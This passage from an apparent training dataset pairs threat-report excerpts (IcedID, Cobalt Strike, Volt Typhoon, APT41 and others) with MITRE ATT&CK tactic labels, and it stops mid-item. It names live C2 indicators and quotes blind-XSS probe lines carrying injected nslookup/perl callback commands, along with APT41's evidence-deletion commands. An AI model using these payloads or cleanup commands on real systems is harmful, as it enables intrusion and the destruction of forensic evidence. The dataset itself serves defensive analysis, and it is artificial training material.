        "input": "Described attack activity: As the 12th largest economy in the world, Mexico draws attention from cyber espionage actors from multiple nations, with targeting patterns mirroring broader priorities and focus areas that we see elsewhere. Since 2020, cyber espionage groups from more than 10 countries have targeted users in Mexico; however, more than $77\\%$ of governmentbacked phishing activity is concentrated among groups from the People's Republic of China (PRC), North Korea, and Russia. \nThe examples here highlight recent and historical examples where cyber espionage actors have targeted users and organizations in Mexico. It should be noted that these campaigns describe targeting and do not indicate successful compromise or exploitation. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Several HTTP Post events were observed to the identified domains denterdrigx[.]com, superliner[.]top and 5.42.199[.]83, masquerading as image uploads.\nThe user agent 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)', an unusual browser configuration to masquerade as, which indicates use of Internet Explorer 8.0 (that was released ~2009).\nThe POST event included a MIME part indicating file upload activity\nThe example HTTP stream containing the content\nThe file that was uploaded 775E.bin was deleted by the injected 'Explorer.exe' process from the target endpoint in folder '\\Users\\<REDACTED>\\AppData\\Local\\Temp'\nThe exfiltration activity along with the beacon activity can be detected using the following network signatures: ET MALWARE Ursnif Variant CnC Data Exfil and ET MALWARE Ursnif Variant CnC Beacon. In this example, the mix of activity can be observed as:",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors attempted and successfully managed to pivot laterally to various hosts on the domain. This was achieved by connecting via SMB and starting a service that would execute an encrypted PowerShell command with embedded Cobalt Strike SMB beacons.\nThe PowerShell is base64 encoded. Decoding the PowerShell shows that the SMB pipe is named \\\\.\\pipe\\halfduplux_9e.\nUsing the 'Administrator' account, SMB sessions were established to the hosts, primarily using ADMIN$, but IPC$ was also observed.\nThis activity triggered two Emerging Threat (ET) alerts related to RPC access and binary execution, \"ET RPC DCERPC SVCCTL  Remote Service Control Manager Access\" and \"ET POLICY SMB2 NT Create AndX Request For an Executable File\".",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 29155 cyber actors have been observed targeting IP ranges [T1595.001] used within multiple government and critical infrastructure organizations. The following are publicly available tools these cyber actors have used for scanning [T1595] and vulnerability exploit efforts. Unit 29155 cyber actors were not observed using these tools outside of their intended purpose. Note: Use of these tools should not be attributed as malicious without analytical evidence to support threat actor use and/or control. \n\uf0a7 Acunetix: Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports, services, and vulnerabilities for networks [T1595.002].[6] \nAmass: Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for target websites [T1590.002].[7] \nDroopescan[8] \nJoomScan[9] \nMASSCAN: Unit 29155 cyber actors used MASSCAN and Nmap to discover other machines once inside victim networks.[10] \nNetcat[11] \nNmap: Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning other machines [T1046]. \nShodan: Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities or device types [T1596.005].[12] \nVirusTotal[13] \nWPScan \nAdditionally, Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration. Adminer in combination with Impacket and ldapdomaindump were tools used for gathering information on AD. Once active devices are found, Unit 29155 cyber actors look for vulnerabilities to exploit. For example, the Acunetix vulnerability scanning tool has been used for gathering information on potential vulnerabilities such as blind cross-site scripting, as shown in the following commands: \nGET /index.php?log=to@example.com>%0d%0abcc:009247.3183- 377.3183.1bf6c.19446.2@bxss.me \n\"GET /CMS/files/log.htm HTTP/1.1\" \\* \\* \"(nslookup hitccruvbrumn76c1b.bxss.me||perl -e \\\"gethostbyname('hitccruvbrumn76c1b.bxss.me')\\\")\" \nAs the cyber actors perform reconnaissance on victim networks and discover vulnerabilities within victim web servers or machines, they obtain CVE exploit scripts from GitHub repositories and use them against victim infrastructure [T1588.005]. Unit 29155 cyber actors have been observed obtaining the respective exploit scripts for, but not exploiting, the following CVEs: \nCVE-2020-1472 (Microsoft: Windows Server) \uf0a7 CVE-2021-26084 (Atlassian Confluence Server and Data Center) \uf0a7 CVE-2021-3156 (Red Hat: Privilege Escalation via Command Line Argument Parsing) \uf0a7 CVE-2021-4034 (Red Hat: Polkit Privilege Escalation) \uf0a7 CVE-2022-27666 (Red Hat: Heap Buffer Overflow Flaw) Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: \nCVE-2021-33044 (Dahua Security) CVE-2021-33045 (Dahua Security) \nCVE-2022-26134 (Atlassian Confluence Server and Data Center) CVE-2022-26138 (Atlassian Confluence Server and Data Center) CVE-2022-3236 (Sophos: Firewall) ",
        "output": "other",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID Discovery\nIcedID was observed executing multiple discovery commands originating fromrundll32.exeon the beachhead.\nThese host profiling commands in this order are typically seen from IcedID bots, and reverse engineering the IcedID binary shows that they are hard-coded (in encrypted strings) to be run when the bot receives a specific command from its command and control server. A published IcedID analysis report fromBinary Defense describes the same commands observed, and a report fromWalmart Global Tech details the algorithm to decryptthe command strings. In different IcedID samples, the commands may appear in a different order, but all versions contain nearly the same list of profiling commands. While alerting on any one of these commands by itself might result in too many false-positive alerts for security operations, a useful technique is to set up alerts when more than three or four of these commands are seen in a short time period on the same host. If the parent process is rundll32, regsvr32, or another high-risk process, the severity of the alert may be elevated.\nActive Directory Enumeration\nAnAD.batbatch script andAdFind.exewere dropped onto the beachhead host from a process injectedsvchost.exeprocess.\nTheAD.batscript was subsequently executed, which initiated discovery of Active Directory via ADFind.\nNslookup Discovery\nAn injected processsvchost.exewas observed dropping ans.batBatch script.\nExecution ofns.batinitiated the execution of nslookup commands that attempted to resolve multiple desktop and server hostnames.\nLater, a secondnsser.batscript was observed executing multiple nslookup commands.\nPort Scanning\nSoftPerfect Network Scanner was used by the threat actor on multiple different systems under different directories.\nNetScan was seen connecting to multiple ports, on multiple different IP addressesan activity indicative of port scanning.\nThe following summarizes a list of ports that were scanned using NetScan.\nHands on Discovery\nDuring RDP sessions the threat actors were also observed opening Task Manager multiple times via the Start Menu, asindicatedby the/7flag.\nOther commands were observed being executed manually by the threat actors, either from Cobalt Strike beacons or in Windows cmd shells opened via the interactive AnyDesk or RDP sessions. Commands included:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The conflict in Ukraine will have a lasting effect on the cybersecurity industry and landscape as a whole. Whether the term \"cyberwar\" applies or not, there is no denying that the conflict will forever change everyone's expectations about cyberactivity conducted in wartime, when a major power is involved. Unfortunately, there is a chance that established practice will become the de facto norm. \nBefore the war broke out, several ongoing multiparty processes (UN's OEWG and GGE) attempted to establish a consensus on acceptable and responsible behavior in cyberspace. Given the extreme geopolitical tensions we are currently experiencing, it is doubtful that these already difficult discussions will bear fruit in the near future. \nA promising initiative in the meantime is the ICRC's \"digital emblem\" project: a proposed solution to clearly identify machines used for medical or humanitarian purposes, in the hopes that attackers will refrain from damaging them. Just like the real-life red cross and red crescent emblems cannot stop bullets, digital emblems will not prevent cyberattacks on a technical level \u2013 but they will at least make it obvious to everyone that medical infrastructure is not a legitimate target. \nAs it seems more and more likely that the conflict will drag on for years, and with the death toll already being high... we hope that everyone can at least agree on that. \nin many cases, but to study how these cyberattacks are used to shape narratives. \n2] This report does not make the assumption that the Russian miltary woulduse coulduse orhas ever used wiper malware. US-CERT however went on the record on this exact subject. So did a \n[3] We recognize that informationabout ongoing cyberattacks and their impact isn't exactly forthcoming. This assessment may be revised at a later date, when more data becomes availabl ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Remote Desktop Protocol\nThe threat actor used RDP to move laterally to critical hosts. In particular, we have evidence on multiple machines of RDP using the Administrator account.\nThe attacker in this intrusion initiated RDP connections from a workstation, named TERZITERZI. See the screenshot below:\nThe RDP connections were established from the Cobalt Strike process running the beacon indicating the threat actor utilizing proxy on the beachhead host to facilitate the RDP traffic.:\nPsExec\nPsExec was used to facilitate the ransomware execution. The threat actor utilized the \"-r\" option in PsExec to define a custom name (mstdc) of the remote service created on the target host (by default it's PSEXESVC).\nWMI\nThrough-out the intrusion the threat actor was also observed using WMIC to perform lateral activities including discovery actions remotely, and as a second option, to ensure all the remote hosts successfully executed the final ransomware payload. The WMIC commands prefaced with/node:IP Addressallowed the threat actor to run commands on remote hosts.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This article reviews the recently discovered FalseFont backdoor, which was used by a suspected Iranian-affiliated threat actor that Unit 42 tracks as Curious Serpens. Curious Serpens (aka Peach Sandstorm) is a known espionage group that has previously targeted the aerospace and energy sectors. FalseFont is the latest tool in Curious Serpens' arsenal. The examples we analyzed show how the threat actors mimic legitimate human resources software, using a fake job recruitment process to trick victims into installing the backdoor.\nOur in-depth technical analysis will help security professionals better understand FalseFont and more effectively defend against this threat. This article focuses on analysis of the newly discovered FalseFont backdoor and its capabilities. Lastly, we'll discuss ways to detect and prevent this targeted backdoor.\nPalo Alto Networks customers are better protected from the threats mentioned in this article in the following ways:\nNext-Generation Firewallwith theAdvanced Threat Preventionsecurity subscription can help block the malware C2 traffic \nAdvanced URL FilteringandDNS Securitycategorize known C2 domains and IPs as malicious. \nOrganizations can engage theUnit 42 Incident Responseteam for specific assistance with this threat and others \nCortex XDRandPrisma Cloud Computecombined with theXSIAMplatform help detect and prevent the threats mentioned in this article \nTheAdvanced WildFiremachine learning-models and analysis techniques have been reviewed and updated in light of this new malware.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: No exfiltration methods were observed beyond the established command and control channels, which can be assessed as likely used to take data like the lsass dump out of the network.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: It appears Cobalt Strike was used to access the LSASS memory space. The access granted was 0x1010 & 0x1fffff. These access patterns were also seen in previous reportshereandhere. These values can be used to identifycredential access.\nPipes were created with the default Cobalt Strike prefix of 'postex_'\nOn one of the domain controllers, an encoded PowerShell command was observed being executed from a Cobalt Strike beacon.\nThis command, once decoded, revealed the execution of theSessionGopher script.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Volt Typhoon actors conduct extensive pre-compromise reconnaissance [TA0043] to learn about the target organization [T1591], its network [T1590], and its staff [T1589]. This includes web searches [T1593]-including victim-owned sites [T1594]-for victim host [T1592], identity, and network information, especially for information on key network and IT administrators. According to industry reporting, Volt Typhoon actors use FOFA[1], Shodan, and Censys for querying or searching for exposed infrastructure. In some instances, the U.S. authoring agencies have observed Volt Typhoon actors targeting the personal emails of key network and IT staff [T1589.002] post compromise. \nResource Development \nHistorically, Volt Typhoon actors use multi-hop proxies for command and control (C2) infrastructure [T1090.003]. The proxy is typically composed of virtual private servers (VPSs) [T1583.003] or small office/home office (SOHO) routers. Recently, Volt Typhoon actors used Cisco and NETGEAR end-oflife SOHO routers implanted with KV Botnet malware to support their operations [T1584.005]. (See DOJ press release U.S. Government Disrupts Botnet People's Republic of China Used to Conceal Hacking of Critical Infrastructure for more information). ",
        "output": "other",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We observed the threat actor using RDP as their main tool to do lateral movement in the environment. Most likely using credentials gathered through dumping of either lsass, or the registry hives. The first instance was through the beachhead where they used Cobalt Strike as a reverse proxy. This also revealed their Workstation Name which isWIN-799RI0TSTOF.\nAfter they installed AnyDesk, they used that access to RDP to other servers in the environment as well as eventually executing their final objective using this access.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The first lateral movement occurred just 3 minutes after the initial access by the threat actor. RDP was initiated from the beachhead host to a domain controller using the valid account they had used to gain access to the first host. RDP continued to be the first method of choice while accessing various systems around the environment. After a few hours in, the threat actors decided to automate some credential collection and used PsExec to execute a PowerShell script that called comsvcs.dll for lsass dumping.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Threat actors rely on Windows built-in utilities for performing initial discovery activity.\nSigma Rules:\nDomain Trust Discovery\nhttps://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_trust_discovery.yml\nSuspicious Reconnaissance Activity\nhttps://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/process_creation/proc_creation_win_susp_recon_activity.yml\nLocal Accounts Discovery\nhttps://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_local_system_owner_account_discovery.yml\nNet.exe Execution\nhttps://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_net_execution.yml\nWhoami Execution\nhttps://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_whoami.yml\nWindows Network Enumeration\nhttps://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_net_enum.yml\nCHCP CodePage Locale Lookup\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/main/CHCP%20CodePage%20Locale%20Lookup\nThey also deploy 3rdparty tools such as Adfind for further enumeration.\nSigma Rules:\nAdFind Discovery\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/main/adfind_discovery\nAdvanced IP Scanner:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_advanced_ip_scanner.yml",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the user had mounted the ISO and the LNK file was executed by the user, the complex execution flow started.\nUrsnif Malware\nHighlighted inInitial Access,the LNK file would execute a batch scriptalsoOne.bat. This script called a JavaScript filecanWell.jsin the same directory and provided a number of strings as arguments.\nalsoOne.bat\ncanWell.js\nThe JS file was then executed withwscript.exeand used the provided command line arguments, which created and executed the following command usingWScript.Shell.Exec():\nUsing the SRUM database, we were able to determine that the custom rundll32.exe binary downloaded approximately 0.4 MB of data.\nOnce the malware was executed, the parent instance of explorer launched MSHTA with the following command:\nThis oneliner created a new ActiveX object to eval() the content stored in the registry key in the users registry hive. The content of the value \"ActiveDevice\":\nThe payload used another ActiveX object to run a PowerShell command. This command created additional aliases of common default PowerShell aliasesgp(Get-ItemProperty) andiex(Invoke-Expression). These two new aliases were used to get and execute the content in another registry value \"MemoryJunk\":\nAnalyst Note: The names of the registry values changed when we ran the payload in a sandbox during analysis, and hence suspected to be generated at random at execution.\nThe last registry key was used to store additional PowerShell code. This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode stored in Base64.\nWhen Add-Type cmdlet is executed, the C# compiler csc.exe is invoked by PowerShell to compile this class definition, which results in the creation of temporary files in %APPDATA%\\Local\\Temp.\nFinally, a unique command spawned from the parent explorer.exe process that was called pause.exe with multiple arguments, which appeared to not provide any additional functionality.\nA sigma rule for this cmdline can be found in theDetectionssection of this report.\nAt this point in time, less than a minute of time has elapsed since the user first opened the malware.\nOnce the malware was established on the host, there was limited malicious activity, until around 3 days later. That is when we began to observe evidence indicative of \"hands-on-keyboard\" activity.\nCobalt Strike\nAn instance of cmd.exe was launched through explorer.exe which ran the following command:\nAnalyst Note: Ursnif has been known to have VNC-like capabilities. It is possible this explorer.exe \u279d cmd.exe session was through a VNC session.\nThis PowerShell command started a BITS job to download a Cobalt Strike beacon from 193.201.9[.]199 and saved it with a random name to %TEMP%. It then read the file into a variable, and deleted it before executing content withIEX.\nThe event logMicrosoft-Windows-Bits-Client%254Operational.evtxcorroborated this activity:\nThe activity following this event demonstrated a clear distinction of the threat actor performing discovery manually.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor was seen deploying Nokoyawa ransomware throughout the environment utilizing both PSExec & WMIC.\nThis duplication of execution using both PsExec and WMIC mirrors the doubled commands used to copy files throughout the network, indicating scripted execution for redundancy.\nThe batch file (p.bat) is responsible for executing the ransomware binary (k.exe) along with its configurations.\nUpon reviewing the configuration provided in the command parameters, this particular ransomware is configured to encrypt the network, load hidden drives, and delete volume shadow copies.\nFurthermore, the configuration informs the ransomware binary to skip the following directories and file extensions.\nRansom Note",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The first stage of any attack is reconnaissance, as part of which threat actors use a wide range of techniques to collect data about the target organization. They can be divided into two categories: active and passive scanning. Below is a list of tools used by APT41 from both categories: \nActive scanning. T.1595: \nAcunetix vulnerability scanner \nNmap network scanner \nUtilities for brute-forcing directories on web servers: OneForAll, subdomain3, subDomainsBrute, Sublist3r \nJexBoss, a tool for searching for and exploiting vulnerabilities in Jbos and other Java applications \nPassive scanning. Search Open Technical Databases: Scan Databases T1596.005: \nfofa.su (a Chinese equivalent of shodan.io) scans the Internet and collects information about open ports and services running on them, which enables attackers to determine their targets and conduct attacks more effectively. ",
        "output": "other",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Shortly after execution, the Truebot malware copied the initial malware to a new location renaming itself to RuntimeBroker.exe, masquerading as an executable responsible for managing certain application permissions.\nAs covered in the execution section, FlawedGrace uses a number of techniques to perform evasion, including encoding, encryption, and storing payloads in the registry. When executing, command-line data was encoded. See theExecution sectionfor a breakdown of the encoding.\nDuring runtime, the FlawedGrace malware decrypts the RC4 encrypted registry stored payload:\nWe observed process injection by all three malware families in this intrusion. First, Truebot used it to inject the Cobalt Strike payload into a cmd.exe process.\nReviewing memory dumps, the injected MZ header for the Cobalt Strike beacon is easily observable in the injected cmd.exe process.\nCobalt Strike was not the only injection with observable headers, each svchost.exe and msiexec.exe also contained telltale injection signs like PAGE_EXECUTE_READWRITE protection and MZ file headers.\nStandard Cobalt Strike named pipes using the postex_* patterns were observed throughout the intrusion.\nSome Registry Items were removed during the FlawedGrace PowerShell execution, specifically the items stored in HKLM:\\SOFTWARE\\2\\:\nFile removal was observed with AdFind.exe being removed by the threat actors as well as Cobalt Strike beacon removal, after being used for lateral movement.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Earth Kasha continues to be an active advanced persistent threat and is now targeting government agencies and public institutions in Taiwan and Japan in its latest campaign which we detected in March 2025. Malicious actors behind the group continue to use spear-phishing to target their victims but employ slightly modified TTPs from their previous campaigns. A malicious Excel file now carries ROAMINGMOUSE, when before they used a Word file; additionally, the malicious routine trigger was also switched from a mousemove event to the click event.\nThe ANEL file we observed in this new campaign encrypts its version number like the ANEL file version from Earth Kasha's previous campaign in 2024, but we found that the ANEL file from the 2025 campaign implemented a new command to support an execution of BOF (Beacon Object File) in memory. This latest campaign also potentially leveraged SharpHide for persistence: to launch the second stage backdoor NOOPDOOR through the Hidden Start (hstart64.exe), and to hide a UI of MSBuild on autorun.\nEnterprises and organizations, especially those with high-value assets like sensitive data relating to governance, as well as intellectual property, infrastructure data, and access credentials should continue to be vigilant and implement proactive security measures to prevent falling victim to cyberattacks. We recommend the following measures so enterprises can help secure against the TTPs discussed in this blog:\nEducate users on the risks of selecting and opening external or unrecognized OneDrive links and implement a zero-trust policy when interacting with such links and files on unrecognized emails. \nMonitor potential abuse of DNS over HTTPS. \nDisable macros downloaded from the internet. \nMaximize endpoint detection response tools to detect suspicious activity.",
        "output": "other",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To obtain initial access [TA0001], Volt Typhoon actors commonly exploit vulnerabilities in networking appliances such as those from Fortinet, Ivanti Connect Secure (formerly Pulse Secure), NETGEAR, Citrix, and Cisco [T1190]. They often use publicly available exploit code for known vulnerabilities [T1588.005] but are also adept at discovering and exploiting zero-day vulnerabilities [T1587.004]. \n\u2022 In one confirmed compromise, Volt Typhoon actors likely obtained initial access by exploiting CVE-2022-42475 in a network perimeter FortiGate 300D firewall that was not patched. There is evidence of a buffer overflow attack identified within the Secure Sockets Layer (SSL)-VPN crash logs. \nOnce initial access is achieved, Volt Typhoon actors typically shift to establishing persistent access [TA0003]. They often use VPN sessions to securely connect to victim environments [T1133], enabling discreet follow-on intrusion activities. This tactic not only provides a stable foothold in the network but also allows them to blend in with regular traffic, significantly reducing their chances of detection. ",
        "output": "initial access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Scheduled TasksOnly one scheduled task was created during this intrusion. The scheduled task was created on the beachhead host upon the execution of IcedID DLL, which executed every hour:\nAtera AgentThreat actors dropped and installed Atera agent (T1219), using two MSI packages \"sql.msi\" and \"mstsc.msi\", from the Cobalt Strike beacons, which allowed them to have a non-malware backdoor in the environment.The installation of those two packages reveals two emails potentially belonging to the ransomware operators or affiliates:\nAteraagent is a remote monitoring and management system. At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Bazar:\nCommunication over DNS to .bazar domains.\nCobalt Strike:\nBeacon Configuration:\nOther Observed Cobalt Strike IP's:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CVE-2020-1472 was used to reset the credentials on one of the domain controllers in the environment. After resetting the password, the threat actors then targeted a different domain controller, potentially due to breaking services by use of their exploit.\nPacket showing the zeroed out password.\nOn one of the domain controllers we saw use of the Cobalt Strike named pipe escalation.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BazarLoader:\n206.189.49.239:443\n159.223.31.75:443\nCobalt Strike C2:\nhiduwu.com108.62.141.87:443\ngawocag.com\n23.81.246.32:443",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access began with a malicious e-mail. The malicious spam campaign can be linked to a publicly reported campaign from@JAMESWT_MHTencouraging victims to download and open a ZIP archive.\nOnce the ZIP file was extracted the user was presented with a Readme and a Visual Basic Script (VBS) file.\nWScript.exe was called when executing the script, which starts the infection.\nThe script embeds a DLL in a slightly obfuscated form and base64 encodes it, saves it in C:\\Windows\\Temp\\0370-1.dll and then executes said DLL through regsvr32.\nThis DLL is an IcedID loader as observed with sandboxinghere. The infection chain was concluded by the loader dropping and executing another IcedID DLL via rundll32.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: YoroTrooper frequently conducts open-source searches of infrastructure they are interested in targeting, using search engines such as Google, Shodan and Censys to find vulnerabilities and leakages in a target's infrastructure. This research includes searching for vulnerable PHP-based servers and identifying content management systems (CMS) to find open directories. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Multiple sensitive files were exfiltrated but before the threat actors could take any further action inside the network, they were evicted from the network. BazarLoader infections currently tend to materialize intoConti ransomware, and many of the TTP's of the infection mimic the instructions from the leakedConti manual.\nInformation posted from@AltShiftPrtScnbased on an IR engagement where the threat actors already had domain admin on the network two months prior meeting their final objectives.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Obfuscated Files or Information: Software Packing  T1027.002 \nBeing discreet and staying in the victim's network unnoticed for as long as possible is the goal of any APT. How did APT41 members try to avoid being noticed and cover their tracks? The threat actors used the well-known protection tool Themida to obfuscate their malicious files. \nIndicator Removal on Host: File Deletion  T1070.004 \nWhen certain files were no longer needed, the attackers deleted them. \ndel C:\\temp\\LxpSvc.exe del c:\\users\\public\\BadPotatoNet4.exe del\\\\172.16.2.21\\c\\$\\users\\Public\\SecurityHealthSystray.dll del\\\\172.16.2.21\\c\\$\\users\\Public\\SecurityHealthSystra.ocx copy\"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx\" \"C:\\PerfLogs\\mwt.evtx\"C:\\PerfLogs\\mwt.evtx rm C:\\PerfLogs\\mwt.evtx\nFile and Directory Permissions Modification: Windows File and Directory Permissions Modification  T1222 \nImpair Defenses: Indicator Blocking  T1562.006 \nAs mentioned earlier, Cobalt Strike was the main tool used in all the campaigns. \nThe threat actors developed a custom injector that makes it possible to bypass Event Tracing for Windows (ETW), thereby making the process invisible to the logging system in Windows. \nThe second noteworthy feature of this injector is a method taken from an open GitHub repository. The idea is to be able to launch a new process in a way as to ensure that neither Windows nor antivirus software can inject their binaries into this process, which enables the threat actors to bypass built-in antivirus tools. \nThe tool is called StealthMutant and it has been described in detail by researchers at Trend Micro. ",
        "output": "defense evasion",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BRONZE BUTLER uses credential theft tools such as Mimikatz and WCE to steal authentication information from the memory of compromised hosts. Several xxmm samples analyzed by CTU researchers incorporate Mimikatz, allowing the threat actors to issue Mimikatz commands directly from xxmm (see Figure 10). In addition, xxmm incorporates a UAC bypass tool for privilege escalation prior to stealing passwords. \nnd Ticket Granting Service (TGS) ure 11 shows an example of the threat \nGolden tickets require a username, but the domain controller does not validate that it is legitimate. CTU researchers detected BRONZE BUTLER using the following usernames for golden tickets: \nbgtras bgtrs kkir kisetr netkin orumls wert ",
        "output": "credential access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker gained access to the victim machine via a fake Google Chrome browser updater executable that the victim was prompted to download from a compromised legitimate news website.  When clicked, the fake browser updater executable \"upd_2327991.exe\" was downloaded onto the victim machine from a second compromised URL of a legitimate retailer. ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
